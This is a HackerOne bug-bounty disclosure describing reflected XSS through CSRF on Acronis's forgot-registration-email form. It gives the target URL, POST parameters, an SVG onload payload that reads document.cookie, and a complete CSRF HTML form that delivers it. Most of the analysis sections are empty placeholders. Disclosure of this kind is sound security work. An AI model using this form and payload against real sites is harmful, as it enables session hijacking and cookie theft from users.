# CSRF and XSS on www.acronis.com

## Metadata
- **Source:** HackerOne
- **Report:** 961787 | https://hackerone.com/reports/961787
- **Submitted:** 2020-08-18
- **Reporter:** cabelo
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Hi team,

I've discovered a XSS Reflected vulnerability on Forgot Registration E-mail form. I performed a POC using CSRF  to inject and execute a javascript code in the POST request.

Target Page: https://www.acronis.com/en-us/my/remind/index.html

POST Data: token=a016902ceaeb6ae91c21302631fbbcfc&SN=818198181891891981981981516518198198&OrderId=&Submit=Send+E-mail%0D%0A

Payload: 1&quot;&lt;!--&gt

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi team,

I've discovered a XSS Reflected vulnerability on Forgot Registration E-mail form. I performed a POC using CSRF  to inject and execute a javascript code in the POST request.

Target Page: https://www.acronis.com/en-us/my/remind/index.html

POST Data: token=a016902ceaeb6ae91c21302631fbbcfc&SN=818198181891891981981981516518198198&OrderId=&Submit=Send+E-mail%0D%0A

Payload: 1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--

Steps to reproduce/POC:

CSRF html page:
{F954073}

CORS html  code:
{F954074}

code:
```
<form action=https://www.acronis.com/en-us/my/remind/index.html method=POST><input type=hidden name="token" value="a016902ceaeb6ae91c21302631fbbcfc"><input type=hidden name="SN" value="818198181891891981981981516518198198"><input type=hidden name="OrderId" value=""><input type=hidden name="Submit" value="Send+E-mail%0D%0A"><input type=hidden name="c" value="1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--"><input type=submit value=XSS-Acronis></form>
```

XSS:
{F954075}

Best Regards.

## Impact

An attacker execute arbitrary JavaScript code in the context of the users website.

</details>

---
*Analysed by Claude on 2026-05-24*
